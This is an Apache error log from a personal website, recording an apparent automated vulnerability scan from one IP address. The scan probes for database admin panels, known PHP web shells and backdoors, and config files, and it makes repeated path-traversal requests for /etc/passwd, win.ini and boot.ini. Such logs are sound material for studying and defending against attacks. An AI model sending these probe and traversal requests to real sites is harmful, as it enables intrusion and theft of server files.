[Thu Jul 08 01:45:26.878970 2021] [php7:error] [pid 10943] [client 27.147.202.214:9009] script '/var/www/html/justinbodnar.com/adminer-4.6.0-mysql.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:27.022213 2021] [php7:error] [pid 10917] [client 27.147.202.214:8987] script '/var/www/html/justinbodnar.com/adminer-4.2.5-en.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:27.022213 2021] [php7:error] [pid 10914] [client 27.147.202.214:9004] script '/var/www/html/justinbodnar.com/adminer-4.5.0-mysql-en.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:27.084760 2021] [php7:error] [pid 10937] [client 27.147.202.214:8999] script '/var/www/html/justinbodnar.com/adminer-4.4.0-en.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:27.113944 2021] [php7:error] [pid 10902] [client 27.147.202.214:8984] script '/var/www/html/justinbodnar.com/ad.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:27.224366 2021] [php7:error] [pid 10236] [client 27.147.202.214:8990] script '/var/www/html/justinbodnar.com/adminer-4.3.0.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:27.542355 2021] [php7:error] [pid 10944] [client 27.147.202.214:8992] script '/var/www/html/justinbodnar.com/adminer-4.3.0-mysql-en.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:27.570757 2021] [php7:error] [pid 10951] [client 27.147.202.214:9002] script '/var/www/html/justinbodnar.com/adminer-4.5.0.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:27.611546 2021] [php7:error] [pid 10949] [client 27.147.202.214:9003] script '/var/www/html/justinbodnar.com/adminer-4.5.0-en.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:27.665344 2021] [php7:error] [pid 10921] [client 27.147.202.214:9018] script '/var/www/html/justinbodnar.com/adminer-4.6.2-en.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:28.036992 2021] [php7:error] [pid 10945] [client 27.147.202.214:9010] script '/var/www/html/justinbodnar.com/adminer-4.6.1.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:28.118468 2021] [php7:error] [pid 10925] [client 27.147.202.214:9020] script '/var/www/html/justinbodnar.com/adminer-4.6.2-mysql.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:28.187568 2021] [php7:error] [pid 10950] [client 27.147.202.214:8982] script '/var/www/html/justinbodnar.com/adminer.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:29.112293 2021] [php7:error] [pid 10946] [client 27.147.202.214:8993] script '/var/www/html/justinbodnar.com/adminer-4.3.0-mysql.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:29.451782 2021] [core:error] [pid 10615] [client 27.147.202.214:6163] AH00126: Invalid URI in request GET /static/../../../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 01:45:29.576999 2021] [php7:error] [pid 10906] [client 27.147.202.214:8995] script '/var/www/html/justinbodnar.com/adminer-4.3.1-en.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:29.991694 2021] [php7:error] [pid 10939] [client 27.147.202.214:8983] script '/var/www/html/justinbodnar.com/ad.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:30.818665 2021] [php7:error] [pid 10950] [client 27.147.202.214:8982] script '/var/www/html/justinbodnar.com/opcache.php' not found or unable to stat
[Thu Jul 08 01:45:31.150378 2021] [php7:error] [pid 10817] [client 27.147.202.214:6151] script '/var/www/html/justinbodnar.com/opcache.php' not found or unable to stat
[Thu Jul 08 01:45:32.841316 2021] [core:error] [pid 10939] [client 27.147.202.214:8983] AH00126: Invalid URI in request GET /%2e%2e/index.js HTTP/1.1
[Thu Jul 08 01:45:32.846531 2021] [php7:error] [pid 10920] [client 27.147.202.214:9001] script '/var/www/html/justinbodnar.com/adminer-4.4.0-mysql.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:33.372945 2021] [php7:error] [pid 10910] [client 27.147.202.214:9000] script '/var/www/html/justinbodnar.com/adminer-4.4.0-mysql-en.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:34.901408 2021] [php7:error] [pid 10942] [client 27.147.202.214:8981] script '/var/www/html/justinbodnar.com/_adminer.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:35.157288 2021] [core:error] [pid 10950] [client 27.147.202.214:8982] AH00126: Invalid URI in request GET /%2e%2e/debug.js HTTP/1.1
[Thu Jul 08 01:45:35.485408 2021] [core:error] [pid 10902] [client 27.147.202.214:8984] AH00126: Invalid URI in request GET /%2e%2e/release.js HTTP/1.1
[Thu Jul 08 01:45:38.003063 2021] [authz_core:error] [pid 10920] [client 27.147.202.214:9001] AH01630: client denied by server configuration: /var/www/html/justinbodnar.com/server-status
[Thu Jul 08 01:45:40.010452 2021] [php7:error] [pid 10840] [client 27.147.202.214:12514] script '/var/www/html/justinbodnar.com/coredumpcheck.php' not found or unable to stat
[Thu Jul 08 01:45:41.586484 2021] [php7:error] [pid 10904] [client 27.147.202.214:8978] script '/var/www/html/justinbodnar.com/loader-wizard.php' not found or unable to stat
[Thu Jul 08 01:45:41.796143 2021] [core:error] [pid 10944] [client 27.147.202.214:12518] AH00126: Invalid URI in request GET @uri1.hit6839495658ca19d.group.bxss.me/ HTTP/1.1
[Thu Jul 08 01:45:42.436052 2021] [core:error] [pid 10901] [client 27.147.202.214:8986] AH00126: Invalid URI in request GET .uri3.hit6839495658ca19d.group.bxss.me/ HTTP/1.1
[Thu Jul 08 01:45:46.109397 2021] [core:error] [pid 10933] [client 27.147.202.214:9053] AH00126: Invalid URI in request GET @bxss.me/rpb.png HTTP/1.1
[Thu Jul 08 01:45:48.365431 2021] [core:error] [pid 10898] [client 27.147.202.214:8971] AH00126: Invalid URI in request GET /sdk/../../../../../../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:45:49.105639 2021] [authz_core:error] [pid 10877] [client 27.147.202.214:9668] AH01630: client denied by server configuration: /var/www/html/justinbodnar.com/server-status
[Thu Jul 08 01:45:49.837250 2021] [php7:error] [pid 10938] [client 27.147.202.214:9691] script '/var/www/html/justinbodnar.com/at395axykauw.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:45:51.208698 2021] [core:error] [pid 10929] [client 27.147.202.214:2457] AH00126: Invalid URI in request GET /../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 01:46:11.708353 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/apc.php' not found or unable to stat
[Thu Jul 08 01:46:11.907669 2021] [authz_core:error] [pid 10857] [client 27.147.202.214:9620] AH01630: client denied by server configuration: /var/www/html/justinbodnar.com/.htaccess
[Thu Jul 08 01:46:12.200905 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/r57shell.php' not found or unable to stat
[Thu Jul 08 01:46:12.210928 2021] [php7:error] [pid 10866] [client 27.147.202.214:9637] script '/var/www/html/justinbodnar.com/webadmin.php' not found or unable to stat
[Thu Jul 08 01:46:12.531535 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/r57.php' not found or unable to stat
[Thu Jul 08 01:46:12.858898 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/r58.php' not found or unable to stat
[Thu Jul 08 01:46:13.184877 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/c99shell.php' not found or unable to stat
[Thu Jul 08 01:46:13.513805 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/c99.php' not found or unable to stat
[Thu Jul 08 01:46:13.841672 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/nstview.php' not found or unable to stat
[Thu Jul 08 01:46:14.199033 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/nst.php' not found or unable to stat
[Thu Jul 08 01:46:14.528032 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/rst.php' not found or unable to stat
[Thu Jul 08 01:46:14.858469 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/r57eng.php' not found or unable to stat
[Thu Jul 08 01:46:15.185912 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/shell.php' not found or unable to stat
[Thu Jul 08 01:46:15.512561 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/dra.php' not found or unable to stat
[Thu Jul 08 01:46:15.860281 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/r.php' not found or unable to stat
[Thu Jul 08 01:46:15.995923 2021] [php7:error] [pid 10877] [client 27.147.202.214:9649] script '/var/www/html/justinbodnar.com/phpinfo.php' not found or unable to stat
[Thu Jul 08 01:46:16.183797 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/lol.php' not found or unable to stat
[Thu Jul 08 01:46:16.510603 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/zehir.php' not found or unable to stat
[Thu Jul 08 01:46:16.822637 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/c-h.v2.php' not found or unable to stat
[Thu Jul 08 01:46:17.158021 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/php-backdoor.php' not found or unable to stat
[Thu Jul 08 01:46:17.487160 2021] [php7:error] [pid 10847] [client 27.147.202.214:9653] script '/var/www/html/justinbodnar.com/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 01:46:18.677043 2021] [php7:error] [pid 10817] [client 27.147.202.214:2456] script '/var/www/html/justinbodnar.com/pi.php' not found or unable to stat
[Thu Jul 08 01:46:20.443745 2021] [php7:error] [pid 10817] [client 27.147.202.214:2456] script '/var/www/html/justinbodnar.com/php.php' not found or unable to stat
[Thu Jul 08 01:46:20.772807 2021] [php7:error] [pid 10817] [client 27.147.202.214:2456] script '/var/www/html/justinbodnar.com/i.php' not found or unable to stat
[Thu Jul 08 01:46:21.660518 2021] [php7:error] [pid 10817] [client 27.147.202.214:2456] script '/var/www/html/justinbodnar.com/test.php' not found or unable to stat
[Thu Jul 08 01:46:21.997201 2021] [php7:error] [pid 10817] [client 27.147.202.214:2456] script '/var/www/html/justinbodnar.com/temp.php' not found or unable to stat
[Thu Jul 08 01:46:22.326306 2021] [php7:error] [pid 10817] [client 27.147.202.214:2456] script '/var/www/html/justinbodnar.com/info.php' not found or unable to stat
[Thu Jul 08 01:46:34.695971 2021] [authz_core:error] [pid 10847] [client 27.147.202.214:9653] AH01630: client denied by server configuration: /var/www/html/justinbodnar.com/.htaccess~
[Thu Jul 08 01:46:35.005599 2021] [authz_core:error] [pid 10847] [client 27.147.202.214:9653] AH01630: client denied by server configuration: /var/www/html/justinbodnar.com/.htaccess.old
[Thu Jul 08 01:46:35.890089 2021] [authz_core:error] [pid 10847] [client 27.147.202.214:9653] AH01630: client denied by server configuration: /var/www/html/justinbodnar.com/.htaccess.save
[Thu Jul 08 01:46:41.154797 2021] [core:error] [pid 10938] [client 27.147.202.214:11114] AH00126: Invalid URI in request GET /css/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 01:46:41.508053 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/r5rXf8N3.php' not found or unable to stat
[Thu Jul 08 01:46:41.557809 2021] [php7:error] [pid 10900] [client 27.147.202.214:11109] script '/var/www/html/justinbodnar.com/css/xwroh6u33j3e.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:46:41.813369 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/db.php' not found or unable to stat
[Thu Jul 08 01:46:42.436140 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/conf.php' not found or unable to stat
[Thu Jul 08 01:46:42.794278 2021] [php7:error] [pid 10209] [client 27.147.202.214:11133] script '/var/www/html/justinbodnar.com/app_dev.php' not found or unable to stat
[Thu Jul 08 01:46:42.859526 2021] [core:error] [pid 10847] [client 27.147.202.214:9653] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:46:43.327441 2021] [php7:error] [pid 10834] [client 27.147.202.214:11123] script '/var/www/html/justinbodnar.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 01:46:43.508619 2021] [core:error] [pid 10925] [client 27.147.202.214:11127] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:46:43.712089 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/settings.php' not found or unable to stat
[Thu Jul 08 01:46:44.074408 2021] [core:error] [pid 10875] [client 27.147.202.214:11118] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:46:44.228493 2021] [php7:error] [pid 10817] [client 27.147.202.214:2456] script '/var/www/html/justinbodnar.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 01:46:44.772125 2021] [core:error] [pid 10870] [client 27.147.202.214:11122] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:46:44.951238 2021] [php7:error] [pid 10946] [client 27.147.202.214:11121] script '/var/www/html/justinbodnar.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 01:46:45.403518 2021] [core:error] [pid 10926] [client 27.147.202.214:11119] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:46:46.277617 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/config.php' not found or unable to stat
[Thu Jul 08 01:46:46.548349 2021] [core:error] [pid 10983] [client 27.147.202.214:11137] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 01:46:46.906150 2021] [php7:error] [pid 10872] [client 27.147.202.214:11147] script '/var/www/html/justinbodnar.com/config.inc.php' not found or unable to stat
[Thu Jul 08 01:46:47.201983 2021] [core:error] [pid 10615] [client 27.147.202.214:11116] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:46:47.235056 2021] [php7:error] [pid 10872] [client 27.147.202.214:11147] script '/var/www/html/justinbodnar.com/localconfig.php' not found or unable to stat
[Thu Jul 08 01:46:47.696399 2021] [core:error] [pid 10946] [client 27.147.202.214:11121] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:46:47.827621 2021] [php7:error] [pid 10835] [client 27.147.202.214:11124] script '/var/www/html/justinbodnar.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 01:46:47.882059 2021] [php7:error] [pid 10872] [client 27.147.202.214:11147] script '/var/www/html/justinbodnar.com/configuration.php' not found or unable to stat
[Thu Jul 08 01:46:48.238517 2021] [core:error] [pid 10873] [client 27.147.202.214:11120] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 01:46:48.515525 2021] [php7:error] [pid 10872] [client 27.147.202.214:11147] script '/var/www/html/justinbodnar.com/settings.inc.php' not found or unable to stat
[Thu Jul 08 01:46:48.835299 2021] [php7:error] [pid 10872] [client 27.147.202.214:11147] script '/var/www/html/justinbodnar.com/global.inc.php' not found or unable to stat
[Thu Jul 08 01:46:49.026894 2021] [core:error] [pid 10935] [client 27.147.202.214:11129] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 01:46:49.151026 2021] [php7:error] [pid 10872] [client 27.147.202.214:11147] script '/var/www/html/justinbodnar.com/database.php' not found or unable to stat
[Thu Jul 08 01:46:49.653588 2021] [core:error] [pid 10906] [client 27.147.202.214:11136] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:46:49.788251 2021] [php7:error] [pid 10872] [client 27.147.202.214:11147] script '/var/www/html/justinbodnar.com/database.inc.php' not found or unable to stat
[Thu Jul 08 01:46:50.823399 2021] [php7:error] [pid 10867] [client 27.147.202.214:11141] script '/var/www/html/justinbodnar.com/phpThumb.php' not found or unable to stat
[Thu Jul 08 01:46:50.840398 2021] [core:error] [pid 10932] [client 27.147.202.214:11117] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:46:51.027524 2021] [core:error] [pid 10817] [client 27.147.202.214:2456] AH00126: Invalid URI in request GET /js/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 01:46:52.841216 2021] [core:error] [pid 10920] [client 27.147.202.214:11131] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 01:46:52.946193 2021] [core:error] [pid 10983] [client 27.147.202.214:2078] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 01:46:53.150587 2021] [core:error] [pid 10992] [client 27.147.202.214:2064] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 01:46:53.267945 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 01:46:53.730262 2021] [core:error] [pid 10924] [client 27.147.202.214:11143] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 01:46:53.873371 2021] [core:error] [pid 10984] [client 27.147.202.214:11142] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 01:46:53.916001 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 01:46:54.044427 2021] [core:error] [pid 10835] [client 27.147.202.214:11124] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 01:46:54.185235 2021] [core:error] [pid 10946] [client 27.147.202.214:2071] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 01:46:54.509865 2021] [php7:error] [pid 10877] [client 27.147.202.214:2081] script '/var/www/html/justinbodnar.com/css/apc.php' not found or unable to stat
[Thu Jul 08 01:46:54.549463 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 01:46:55.177356 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 01:46:55.806265 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/soap.php' not found or unable to stat
[Thu Jul 08 01:46:55.998145 2021] [core:error] [pid 10884] [client 27.147.202.214:2072] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:46:56.446926 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/soap.php' not found or unable to stat
[Thu Jul 08 01:46:56.967552 2021] [authz_core:error] [pid 10867] [client 27.147.202.214:11141] AH01630: client denied by server configuration: /var/www/html/justinbodnar.com/css/.htaccess
[Thu Jul 08 01:46:57.634179 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/soap.php' not found or unable to stat
[Thu Jul 08 01:46:57.984471 2021] [php7:error] [pid 10892] [client 27.147.202.214:2062] script '/var/www/html/justinbodnar.com/css/phpinfo.php' not found or unable to stat
[Thu Jul 08 01:46:58.681069 2021] [core:error] [pid 10854] [client 27.147.202.214:11134] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 01:46:58.798089 2021] [php7:error] [pid 10564] [client 27.147.202.214:2075] script '/var/www/html/justinbodnar.com/css/webadmin.php' not found or unable to stat
[Thu Jul 08 01:46:58.825459 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/soap.php' not found or unable to stat
[Thu Jul 08 01:46:59.004071 2021] [core:error] [pid 10892] [client 27.147.202.214:2062] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 01:46:59.148128 2021] [core:error] [pid 10564] [client 27.147.202.214:2075] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:46:59.287326 2021] [php7:error] [pid 10994] [client 27.147.202.214:2061] script '/var/www/html/justinbodnar.com/css/r57shell.php' not found or unable to stat
[Thu Jul 08 01:46:59.315517 2021] [php7:error] [pid 10840] [client 27.147.202.214:8552] script '/var/www/html/justinbodnar.com/css/pi.php' not found or unable to stat
[Thu Jul 08 01:46:59.615301 2021] [php7:error] [pid 10994] [client 27.147.202.214:2061] script '/var/www/html/justinbodnar.com/css/r57.php' not found or unable to stat
[Thu Jul 08 01:46:59.793203 2021] [core:error] [pid 10867] [client 27.147.202.214:11141] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:46:59.934777 2021] [php7:error] [pid 10994] [client 27.147.202.214:2061] script '/var/www/html/justinbodnar.com/css/r58.php' not found or unable to stat
[Thu Jul 08 01:46:59.952262 2021] [php7:error] [pid 10840] [client 27.147.202.214:8552] script '/var/www/html/justinbodnar.com/css/php.php' not found or unable to stat
[Thu Jul 08 01:47:00.275033 2021] [php7:error] [pid 10938] [client 27.147.202.214:2073] script '/var/www/html/justinbodnar.com/css/i.php' not found or unable to stat
[Thu Jul 08 01:47:00.420233 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 01:47:00.474571 2021] [core:error] [pid 11005] [client 27.147.202.214:2076] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 01:47:00.821124 2021] [php7:error] [pid 10994] [client 27.147.202.214:2061] script '/var/www/html/justinbodnar.com/css/c99shell.php' not found or unable to stat
[Thu Jul 08 01:47:00.878337 2021] [core:error] [pid 11007] [client 27.147.202.214:2063] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:47:01.085750 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 01:47:01.644859 2021] [php7:error] [pid 10938] [client 27.147.202.214:2073] script '/var/www/html/justinbodnar.com/css/test.php' not found or unable to stat
[Thu Jul 08 01:47:01.720342 2021] [php7:error] [pid 10840] [client 27.147.202.214:8552] script '/var/www/html/justinbodnar.com/css/c99.php' not found or unable to stat
[Thu Jul 08 01:47:01.744674 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 01:47:01.965529 2021] [php7:error] [pid 10938] [client 27.147.202.214:2073] script '/var/www/html/justinbodnar.com/css/temp.php' not found or unable to stat
[Thu Jul 08 01:47:02.044065 2021] [php7:error] [pid 10840] [client 27.147.202.214:8552] script '/var/www/html/justinbodnar.com/css/nstview.php' not found or unable to stat
[Thu Jul 08 01:47:02.156587 2021] [core:error] [pid 10834] [client 27.147.202.214:11123] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:47:02.284875 2021] [php7:error] [pid 10938] [client 27.147.202.214:2073] script '/var/www/html/justinbodnar.com/css/info.php' not found or unable to stat
[Thu Jul 08 01:47:02.361626 2021] [php7:error] [pid 10840] [client 27.147.202.214:8552] script '/var/www/html/justinbodnar.com/css/nst.php' not found or unable to stat
[Thu Jul 08 01:47:02.404212 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 01:47:02.682846 2021] [php7:error] [pid 10938] [client 27.147.202.214:2073] script '/var/www/html/justinbodnar.com/css/rst.php' not found or unable to stat
[Thu Jul 08 01:47:02.796182 2021] [php7:error] [pid 10844] [client 27.147.202.214:11140] script '/var/www/html/justinbodnar.com/login.php' not found or unable to stat
[Thu Jul 08 01:47:02.797183 2021] [core:error] [pid 10887] [client 27.147.202.214:2046] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:03.066013 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 01:47:03.117358 2021] [core:error] [pid 10994] [client 27.147.202.214:2061] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:47:03.295095 2021] [core:error] [pid 10917] [client 27.147.202.214:2079] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:03.562612 2021] [php7:error] [pid 10938] [client 27.147.202.214:2073] script '/var/www/html/justinbodnar.com/css/r57eng.php' not found or unable to stat
[Thu Jul 08 01:47:03.714947 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 01:47:03.758416 2021] [core:error] [pid 10892] [client 27.147.202.214:8605] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:04.370517 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 01:47:04.655996 2021] [core:error] [pid 10857] [client 27.147.202.214:2080] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 01:47:05.040527 2021] [php7:error] [pid 10908] [client 27.147.202.214:11139] script '/var/www/html/justinbodnar.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 01:47:05.487406 2021] [core:error] [pid 10869] [client 27.147.202.214:11164] AH00126: Invalid URI in request GET /fonts/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 01:47:05.543503 2021] [php7:error] [pid 10954] [client 27.147.202.214:11135] script '/var/www/html/justinbodnar.com/css/shell.php' not found or unable to stat
[Thu Jul 08 01:47:05.872794 2021] [php7:error] [pid 10954] [client 27.147.202.214:11135] script '/var/www/html/justinbodnar.com/css/dra.php' not found or unable to stat
[Thu Jul 08 01:47:06.205898 2021] [php7:error] [pid 10954] [client 27.147.202.214:11135] script '/var/www/html/justinbodnar.com/css/r.php' not found or unable to stat
[Thu Jul 08 01:47:06.536303 2021] [php7:error] [pid 10954] [client 27.147.202.214:11135] script '/var/www/html/justinbodnar.com/css/lol.php' not found or unable to stat
[Thu Jul 08 01:47:06.837369 2021] [core:error] [pid 11007] [client 27.147.202.214:8653] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 01:47:06.875539 2021] [php7:error] [pid 10954] [client 27.147.202.214:11135] script '/var/www/html/justinbodnar.com/css/zehir.php' not found or unable to stat
[Thu Jul 08 01:47:06.896068 2021] [core:error] [pid 10642] [client 27.147.202.214:2074] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 01:47:07.202057 2021] [php7:error] [pid 10954] [client 27.147.202.214:11135] script '/var/www/html/justinbodnar.com/css/c-h.v2.php' not found or unable to stat
[Thu Jul 08 01:47:07.414260 2021] [php7:error] [pid 10937] [client 27.147.202.214:8658] script '/var/www/html/justinbodnar.com/fonts/eml6b6v4wrro.php' not found or unable to stat, referer: https://www.justinbodnar.com/
[Thu Jul 08 01:47:07.536860 2021] [php7:error] [pid 10979] [client 27.147.202.214:11138] script '/var/www/html/justinbodnar.com/css/php-backdoor.php' not found or unable to stat
